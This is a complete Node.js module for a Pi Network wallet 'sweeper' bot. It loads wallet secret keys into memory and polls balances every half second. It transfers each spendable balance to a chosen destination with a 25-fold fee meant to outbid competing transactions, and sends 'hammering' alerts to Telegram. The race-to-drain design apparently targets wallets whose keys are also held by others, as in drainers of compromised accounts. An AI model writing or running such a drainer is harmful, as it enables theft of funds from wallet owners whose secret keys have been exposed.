'use strict';

const fs = require('fs');
const path = require('path');
const StellarSdk = require('@stellar/stellar-sdk');

const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';
const NETWORK_PASSPHRASE = process.env.STELLAR_NETWORK_PASSPHRASE || 'Pi Network';
const DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
const POLL_INTERVAL_MS = Math.max(10, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
const DATA_DIR = process.env.DATA_DIR || '/data';

const server = new StellarSdk.Horizon.Server(HORIZON_URL);
let monitorRunning = false;
let monitorTimeoutId = null;

// IN-MEMORY STORAGE (RAM) - Keys are never saved to disk
const liveWalletsMap = new Map();

function getErrorDetails(error) {
  if (error?.response?.data?.extras?.result_codes) {
    return JSON.stringify(error.response.data.extras.result_codes);
  }
  return error?.response?.data?.title || error?.message || String(error);
}

function log(level, message, details) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [Sweeper ${level}] ${message}`, details || '');
}

function initDatabase() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const Database = require('better-sqlite3');
  const db = new Database(path.join(DATA_DIR, 'sweeper.db'));
  db.pragma('journal_mode = WAL');
  
  db.exec(`
    CREATE TABLE IF NOT EXISTS sweeper_transactions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      wallet_id TEXT NOT NULL,
      source_address TEXT NOT NULL,
      destination_address TEXT NOT NULL,
      amount TEXT NOT NULL,
      transaction_hash TEXT,
      status TEXT NOT NULL,
      error_details TEXT,
      created_at TEXT NOT NULL
    );
  `);
  return db;
}

const WalletManager = {
  addLiveWallet({ id, publicKey, secretKey, label, chatId, customAmount, destination }) {
    liveWalletsMap.set(String(id), { 
      id, 
      publicKey, 
      public_key: publicKey, 
      secretKey, 
      secret_key: secretKey, 
      label, 
      chatId,
      chat_id: chatId,       
      customAmount: customAmount ? Number(customAmount) : null,
      destination: destination || DESTINATION,
      custom_destination: destination || DESTINATION
    });
    log('INFO', `Wallet Box #${id} loaded successfully into volatile system memory with destination: ${destination || DESTINATION}`);
  },
  
  removeLiveWallet(id) {
    return liveWalletsMap.delete(String(id));
  },

  getLiveWallets() {
    return Array.from(liveWalletsMap.values());
  }
};

async function notifyTelegram(bot, chatId, message) {
  if (!bot || !chatId) return;
  try {
    await bot.sendMessage(chatId, message, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (error) {
    log('ERROR', 'Telegram notification dispatch failed', error.message);
  }
}

const SweeperEngine = {
  async evaluateBalance(publicKey) {
    try {
      const account = await server.loadAccount(publicKey);
      const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');
      if (!native) return { spendable: 0, verified: false, total: 0 };

      const ledgerTotal = Number(native.balance || 0);
      let locked = 0;
      if (Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
        locked = Number(native.locked_balance || 0);
      } else if (Object.prototype.hasOwnProperty.call(account, 'locked_balance')) {
        locked = Number(account.locked_balance || 0);
      }

      const spendable = Math.max(0, ledgerTotal - locked);
      return { spendable, verified: true, total: ledgerTotal };
    } catch (error) {
      return { spendable: 0, verified: false, total: 0 };
    }
  },

  async executeInstantSweep(db, bot, wallet) {
    const id = String(wallet.id);
    const pubKey = wallet.public_key || wallet.publicKey;
    const secKey = wallet.secret_key || wallet.secretKey;
    const chatTarget = wallet.chat_id || wallet.chatId;
    const targetDestination = wallet.destination || wallet.custom_destination || DESTINATION;

    try {
      if (!targetDestination) throw new Error('Sweep destination address is empty.');
      const sourceKeypair = StellarSdk.Keypair.fromSecret(secKey);

      let baseFee = 100;
      try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }

      const evalResult = await this.evaluateBalance(pubKey);

      if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
        return { status: 'NO_SWEEPABLE_FUNDS' };
      }

      let targetAmount = 0;

      // Dual-Mode: Custom Amount vs Default Tiered Logic
      if (wallet.customAmount && wallet.customAmount > 0) {
        if (evalResult.spendable >= wallet.customAmount) {
          targetAmount = wallet.customAmount;
        } else {
          return { status: 'BELOW_FIXED_TARGET' };
        }
      } else {
        // Tiered Auto-Strategy: > 1 Pi leaves 1 Pi; between 0.02 and 1 Pi leaves 0.02 Pi
        if (evalResult.spendable > 1.0) {
          targetAmount = evalResult.spendable - 1.0;
        } else if (evalResult.spendable > 0.02) {
          targetAmount = evalResult.spendable - 0.02;
        } else {
          return { status: 'BELOW_THRESHOLD' };
        }
      }

      if (targetAmount <= 0) {
        return { status: 'POOL_EXHAUSTED' };
      }

      log('INFO', `AGGRESSIVE HAMMER: Wallet Box #${id} balance: ${evalResult.spendable} Pi. Blasting target: ${targetAmount} Pi to ${targetDestination}`);
      await notifyTelegram(bot, chatTarget, `🔥 <b>HAMMERING WALLET (AGGRESSIVE MODE)!</b>\n📦 Box: #${wallet.id}\n💰 Balance: <code>${evalResult.spendable.toFixed(7)} Pi</code>\n🎯 Blasting Target: <code>${targetAmount.toFixed(7)} Pi</code>`);

      let success = false, sweptAmount = 0, txHash = '', errorReason = '';
      let remainingBalance = evalResult.spendable - targetAmount;

      try {
        const freshAccount = await server.loadAccount(pubKey);
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: String(baseFee * 25), // Maximum fee multiplier to outbid competitors instantly
          networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
          destination: targetDestination,
          asset: StellarSdk.Asset.native(),
          amount: targetAmount.toFixed(7)
        }))
        .setTimeout(10).build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        sweptAmount = targetAmount;
        txHash = response.hash || response.result?.hash || response.id || 'Submitted Successfully';
        success = true;
      } catch (err) {
        errorReason = getErrorDetails(err);
      }

      const now = new Date().toISOString();
      if (success) {
        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, transaction_hash, status, created_at) VALUES (?, ?, ?, ?, ?, 'SUCCESS', ?)`).run(id, pubKey, targetDestination, String(sweptAmount), txHash, now);
        await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP HAMMER SUCCESS!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Buffer: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
        return { status: 'SUCCESS' };
      } else {
        db.prepare(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, status, error_details, created_at) VALUES (?, ?, ?, '0', 'FAILED', ?, ?)`).run(id, pubKey, targetDestination, errorReason, now);
        log('WARN', `Hammer attempt blocked/failed on Box #${id}: ${errorReason}. Retrying next cycle...`);
        return { status: 'FAILED' };
      }
    } catch (criticalError) {
      log('ERROR', `Hammer Loop Failure on Box #${id}`, criticalError.message);
    }
  }
};

function startSweeperEngine(db, bot) {
  if (monitorRunning) return;
  monitorRunning = true;

  const corePollingCycle = async () => {
    if (!monitorRunning) return;
    try {
      const wallets = WalletManager.getLiveWallets();
      for (const wallet of wallets) {
        await SweeperEngine.executeInstantSweep(db, bot, wallet);
      }
    } catch (err) {
      log('ERROR', 'Polling loop track exception', err.message);
    }
    if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
  };
  corePollingCycle();
}

function stopSweeperEngine() {
  monitorRunning = false;
  if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}

module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };
